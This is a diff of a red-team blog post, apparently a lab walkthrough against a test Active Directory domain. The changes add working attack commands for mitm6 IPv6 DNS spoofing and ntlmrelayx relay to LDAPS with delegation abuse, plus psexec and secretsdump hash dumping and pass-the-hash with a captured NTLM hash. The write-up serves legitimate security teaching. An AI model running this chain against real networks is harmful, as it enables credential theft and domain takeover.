@@ -78,7 +78,7 @@ This scan is to determine the domain name and the alive machines.
 netexec smb 192.168.56.100-254
 ```
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-1.png)](http://127.0.0.1:4000/)
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-1.png)](https://r00tven0m.github.io/)
 Nice we get two machine alive first DC and Second WS02 and we get domain name `cbank.local`
 
 Also since we are creating new machine account we need to check if the LDAP over TLS (LDAPS) is configure, to do so we will use Nmap to scan the DC for port(636):
@@ -87,21 +87,29 @@ Also since we are creating new machine account we need to check if the LDAP over
 sudo nmap 192.168.56.100  -p636  -Pn
 ```
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-2.png)](http://127.0.0.1:4000/)
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-2.png)](https://r00tven0m.github.io/)
 Now that we have met all the necessary conditions for the attack, we will proceed to execute it using both the MITM6 framework and Impacket ntlmrelayx. This will allow us to relay captured credentials to LDAPS and create a new machine account using the obtained credentials. To ensure the success of the attack, it's essential to whitelist specific targets, particularly those whose machines are expected to be rebooted (client machines), while our MITM6 server is active. This will redirect traffic from the targets to our rogue DNS server. To simplify the process, I have whitelisted WS02 and will initiate the reboot from that machine in my environment.
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-3.png)](http://127.0.0.1:4000/)
+```bash
+sudo mitm6 -d cbank.local --interface vboxnet0 -hw WS02 --no-ra
+```
+
+
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-3.png)](https://r00tven0m.github.io/)
 And execute ntlmrelayx targeting LDAPS on the DC as follow:
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-4.png)](http://127.0.0.1:4000/)
+```bash
+sudo impacket-ntlmrelayx -ts -6 -t ldaps://dc01.cbank.local -wh fake-wpad --add-computer --delegate-access
+```
+
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-4.png)](https://r00tven0m.github.io/)
 If everything goes as expected, we will observe that ntlmrelayx starts capturing credential data and attempts to attack LDAPS on the domain controller.
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-5.png)](http://127.0.0.1:4000/)
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-5.png)](https://r00tven0m.github.io/)
 
 Once ntlmrelayx successfully authenticates to LDAPS using the relayed credentials, it will proceed to attempt the creation of a new machine account using these credentials. It will also modify the "msDS-AllowedToActOnBehalfOtherIdentity" file on the computer named Mark to allow the newly created machine to impersonate any user.
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-6.png)](http://127.0.0.1:4000/)
-```bash
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-6.png)](https://r00tven0m.github.io/)
 Adding new computer with username: JHEDTLNY$ and password: B!y#d,<eQG,5kze result: OK
 
 ```
@@ -116,7 +124,7 @@ impacket-psexec -no-pass -k WS02.cbank.local
 ```
 
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-7.png)](http://127.0.0.1:4000/)
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-7.png)](https://r00tven0m.github.io/)
 
 We can use the Kerberos service ticket with Impackt SecretsDump to dump local hashes
 
@@ -125,14 +133,14 @@ impacket-secretsdump -no-pass -k WS02.cbank.local
 
 ```
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-8.png)](http://127.0.0.1:4000/)
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-8.png)](https://r00tven0m.github.io/)
  We can use the WS02 to  enumeration 
 
 ```bash
 netexec smb 192.168.56.100 -u WS02$ -H aad3b435b51404eeaad3b435b51404ee:0fd304d236c226b007307984f7c6f766 --shares
 ```
 
-[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-9.png)](http://127.0.0.1:4000/)
+[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-9.png)](https://r00tven0m.github.io/)
 
 # References
 
